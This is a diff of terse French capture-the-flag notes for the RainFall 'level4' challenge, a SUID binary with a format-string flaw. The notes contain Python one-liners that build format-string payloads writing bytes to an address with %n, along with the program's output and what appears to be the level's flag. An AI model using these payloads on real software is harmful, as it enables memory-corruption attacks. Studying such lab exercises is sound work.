@@ -1,2 +1,17 @@
-r < <(python -c 'print "\x12\x98\x04\x08" + "A" * 186 + "%x" * 11 + "%n"')
-r < <(python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "A" * 244 + "%x" * 11 + "%n" + "B" * 17 + "%n" + "C" * 0 + "%n"')
+Connextion au level3 -> Bit NX desactive
+Chech du home et des permissions du binaire -> Bit SUID level5
+Exection du binaire -> attente d'ecriture sur l'entree standard et reaffichage de la chaine sur la sortie (echo like)
+
+"""
+level4@Rainfaill:~$ ./level4
+abc
+abc
+"""
+
+Reecriture du code source en utilisant objdump -d et gdb avec peda
+
+Programme similaire a celui du level precedent
+
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "%c" * 11 + "A" * 45 + "%n" + "B" * 17 + "%n" + "C" * 173 + "%n"' | ./level4
+�T����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
